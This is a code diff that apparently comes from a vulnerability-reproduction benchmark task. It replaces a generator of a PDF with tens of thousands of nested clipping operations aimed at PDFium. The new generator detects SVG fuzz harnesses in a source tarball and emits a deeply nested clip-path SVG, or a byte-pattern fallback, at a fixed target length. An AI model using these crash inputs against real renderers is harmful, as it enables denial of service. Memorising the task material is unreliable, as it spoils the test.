@@ -3,88 +3,100 @@ import tarfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        if self._is_pdfium(src_path):
-            return self._build_pdf_clip_poc()
-        # Fallback: arbitrary small input (unlikely to trigger anything, but keeps behavior defined)
-        return b"A" * 100
+        """
+        Generate a PoC that triggers the vulnerability.
+        """
+        L_DEFAULT = 825_339
 
-    def _is_pdfium(self, src_path: str) -> bool:
         try:
             with tarfile.open(src_path, "r:*") as tar:
-                for i, member in enumerate(tar):
-                    name = member.name.lower()
-                    if "pdfium" in name:
-                        return True
-                    if "core/fpdfapi" in name or "core/fxge" in name or "fpdfsdk" in name:
-                        return True
-                    if i > 1000:
-                        break
+                harnesses = []
+                project_svg_hint = False
+
+                for member in tar.getmembers():
+                    if not member.isfile():
+                        continue
+                    if member.size > 1_000_000:
+                        continue
+
+                    f = tar.extractfile(member)
+                    if not f:
+                        continue
+
+                    try:
+                        data = f.read()
+                    except Exception:
+                        continue
+
+                    lower_data = data.lower()
+
+                    if b"llvmfuzzertestoneinput" in lower_data:
+                        harnesses.append((member.name, data))
+
+                    if (
+                        b'xmlns="http://www.w3.org/2000/svg"' in lower_data
+                        or b"<svg" in lower_data
+                        or b"librsvg" in lower_data
+                        or b"svgdocument" in lower_data
+                    ):
+                        project_svg_hint = True
+
+                chosen_harness = harnesses[0] if harnesses else None
+                is_svg = False
+
+                if chosen_harness:
+                    _, hdata = chosen_harness
+                    text_lower = hdata.decode("utf-8", "ignore").lower()
+                    if "svg" in text_lower or "librsvg" in text_lower or project_svg_hint:
+                        is_svg = True
+                else:
+                    if project_svg_hint:
+                        is_svg = True
+
+                if is_svg:
+                    return self._build_svg_poc(L_DEFAULT)
+                else:
+                    return self._build_binary_poc(L_DEFAULT)
+
         except Exception:
-            return False
-        return False
+            return self._build_binary_poc(825_339)
 
-    def _build_pdf_clip_poc(self, num_layers: int = 35000) -> bytes:
-        # PDF header with binary marker
-        header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
+    def _build_svg_poc(self, target_len: int) -> bytes:
+        header = '<?xml version="1.0" encoding="UTF-8"?>\n'
+        header += '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
+        defs = "<defs>\n"
+        defs += '<clipPath id="c0"><rect x="0" y="0" width="100" height="100"/></clipPath>\n'
+        defs += "</defs>\n"
 
-        # Build a very deep nesting of clipping operations in the content stream.
-        # Pattern: start with one 'q', then for each layer:
-        #   0 0 100 100 re W n q
-        # which defines a rectangle, applies it as a clipping path, then saves
-        # graphics state again for the next layer. Finally, close all with Q's.
-        pattern = "0 0 100 100 re W n q\n"
-        content_parts = []
-        content_parts.append("q\n")
-        content_parts.extend([pattern] * num_layers)
-        content_parts.extend(["Q\n"] * (num_layers + 1))
-        content_str = "".join(content_parts)
-        content_bytes = content_str.encode("ascii")
+        parts = [header, defs]
 
-        # PDF objects
-        obj1 = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
-        obj2 = "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
-        obj3 = (
-            "3 0 obj\n"
-            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
-            "endobj\n"
-        )
-        obj4 = (
-            "4 0 obj\n<< /Length "
-            + str(len(content_bytes))
-            + " >>\nstream\n"
-            + content_str
-            + "endstream\nendobj\n"
-        )
+        # Estimate a large nesting depth based on target length.
+        approx_open_tag_len = len('<g clip-path="url(#c0)" id="g12345">\n')
+        min_depth = 2000
+        depth = max(target_len // (approx_open_tag_len * 2), min_depth)
+        if depth > 50000:
+            depth = 50000
 
-        objects = [obj1, obj2, obj3, obj4]
+        for i in range(depth):
+            parts.append(f'<g clip-path="url(#c0)" id="g{i}">\n')
 
-        # Compute byte offsets for xref
-        offsets = []
-        current_offset = len(header)
-        for obj in objects:
-            offsets.append(current_offset)
-            current_offset += len(obj.encode("ascii"))
+        parts.append('<rect x="0" y="0" width="100" height="100"/>\n')
 
-        # Build the PDF body
-        pdf = bytearray()
-        pdf.extend(header)
-        for obj in objects:
-            pdf.extend(obj.encode("ascii"))
+        for _ in range(depth):
+            parts.append("</g>\n")
 
-        # xref table
-        xref_offset = len(pdf)
-        xref_entries = ["0000000000 65535 f \n"]
-        for off in offsets:
-            xref_entries.append("{:010d} 00000 n \n".format(off))
+        parts.append("</svg>\n")
 
-        xref_str = (
-            "xref\n0 5\n"
-            + "".join(xref_entries)
-            + "trailer\n<< /Size 5 /Root 1 0 R >>\n"
-            + "startxref\n"
-            + str(xref_offset)
-            + "\n%%EOF\n"
-        )
-        pdf.extend(xref_str.encode("ascii"))
+        s = "".join(parts)
 
-        return bytes(pdf)
+        if len(s) < target_len:
+            pad_unit = "<!-- clip padding to increase nesting load -->\n"
+            reps = target_len // len(pad_unit) + 2
+            s += pad_unit * reps
+
+        return s[:target_len].encode("utf-8")
+
+    def _build_binary_poc(self, length: int) -> bytes:
+        pattern = bytes(range(256))
+        reps, rem = divmod(length, len(pattern))
+        return pattern * reps + pattern[:rem]
